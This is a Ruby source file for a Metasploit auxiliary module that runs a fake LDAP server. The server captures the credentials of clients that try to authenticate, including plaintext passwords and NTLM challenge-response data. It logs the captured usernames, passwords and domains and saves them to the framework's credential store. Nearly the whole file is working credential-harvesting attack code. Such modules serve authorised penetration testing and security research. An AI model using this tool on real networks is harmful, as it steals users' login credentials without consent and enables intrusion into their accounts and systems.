##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::LDAP::Server

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Authentication Capture: LDAP',
        'Description' => %q{
          This module mocks an LDAP service to capture authentication
          information of a client trying to authenticate against an LDAP service
        },
        'Author' => 'JustAnda7',
        'License' => MSF_LICENSE,
        'Action' => [
          [ 'Capture', { 'Description' => 'Run an LDAP capture server' } ]
        ],
        'PassiveActions' => [ 'Capture' ],
        'DefaultActions' => 'Capture',
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        OptAddress.new('SRVHOST', [ true, 'The localhost to listen on.', '0.0.0.0' ]),
        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', '389' ]),
        OptString.new('CHALLENGE', [ true, 'The 8 byte challenge', Rex::Text.rand_text_alphanumeric(16) ])
      ]
    )

    deregister_options('LDIF_FILE')

    register_advanced_options(
      [
        OptString.new('Domain', [ false, 'The default domain to use for NTLM authentication', 'DOMAIN']),
        OptString.new('Server', [ false, 'The default server to use for NTLM authentication', 'SERVER']),
        OptString.new('DnsName', [ false, 'The default DNS server name to use for NTLM authentication', 'SERVER']),
        OptString.new('DnsDomain', [ false, 'The default DNS domain name to use for NTLM authentication', 'example.com']),
        OptBool.new('ForceDefault', [ false, 'Force the default settings', false]),
        OptPath.new('LDIF_FILE', [ false, 'Directory LDIF file path'])
      ]
    )
  end

  def run
    unless datastore['CHALLENGE'].to_s =~ /^([a-zA-Z0-9]{16})$/
      print_error('CHALLENGE syntax must match 1122334455667788')
      return
    end
    start_service
    service.wait
  rescue Rex::BindFailed => e
    print_error "Failed to bind to port #{datastore['SRVPORT']}: #{e.message}"
  end

  def on_dispatch_request(client, data)
    return if data.strip.empty? || data.strip.nil?

    state = {}

    state[client] = {
      name: "#{client.peerhost}:#{client.peerport}",
      ip: client.peerhost,
      port: client.peerport,
      service_name: 'ldap'
    }

    data.extend(Net::BER::Extensions::String)
    begin
      pdu = Net::LDAP::PDU.new(data.read_ber!(Net::LDAP::AsnSyntax))
      vprint_status("LDAP request data remaining: #{data}") unless data.empty?

      res = case pdu.app_tag
            when Net::LDAP::PDU::BindRequest
              result_message = ""
              user_login = pdu.bind_parameters
              
              auth_info = process_login_request(user_login)
              auth_info = auth_info.merge(state[:client])
              if auth_info[:error_msg]
                print_error(auth_info[:error_msg])
              else
                if user_login.authentication[1] =~ /NTLMSSP/ && auth_info[:ntlm_t2]
                  response = encode_ldapsasl_response(
                      pdu.message_id,
                      Net::LDAP::ResultCodeSaslBindInProgress,
                      '',
                      '',
                      auth_info[:ntlm_t2],
                      Net::LDAP::PDU::BindResult
                    )
                  on_send_response(client, response)
                  return
                else
                  result_message = "LDAP Login Attempt => From:#{auth_info[:name]} Username:#{auth_info[:user]} Password:#{auth_info[:private]}"
                  result_message += " Domain:#{auth_info[:domain]}" if auth_info[:domain]
                  print_good(result_message)
                  report_cred(auth_info)
                end
              end
              service.encode_ldap_response(
                pdu.message_id,
                auth_info[:result_code],
                '',
                Net::LDAP::ResultStrings[auth_info[:result_code]],
                Net::LDAP::PDU::BindResult
              )
            when Net::LDAP::PDU::SearchRequest
              filter = Net::LDAP::Filter.parse_ldap_filter(pdu.search_parameters[:filter])
              attrs = pdu.search_parameters[:attributes].empty? ? :all : pdu.search_parameters[:attributes]
              res = search_res(filter, pdu.message_id, attrs)
              if res.nil? || res.empty?
                result_code = Net::LDAP::ResultCodeNoSuchObject
              else
                client.write(res)
                result_code = Net::LDAP::ResultCodeSuccess
              end
              service.encode_ldap_response(
                pdu.message_id,
                result_code,
                '',
                Net::LDAP::ResultStrings[result_code],
                Net::LDAP::PDU::SearchResult
              )
            when Net::LDAP::PDU::UnbindRequest
              client.close
              nil
            else
              if suitable_response(pdu.app_tag)
                result_code = Net::LDAP::ResultCodeUnwillingToPerform
                service.encode_ldap_response(
                  pdu.message_id,
                  result_code,
                  '',
                  Net::LDAP::ResultStrings[result_code],
                  suitable_response(pdu.app_tag)
                )
              else
                client.close
              end
            end

      on_send_response(client, res) unless res.nil?
    rescue StandardError => e
      client.close
      print_error("Failed to handle LDAP request due to #{e}")
    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:private],
      private_type: opts[:private_type]
    }.merge(service_data)

    if opts[:domain]
      credential_data = {
        realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
        realm_value: opts[:domain]
      }.merge(credential_data)
    end

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end
end
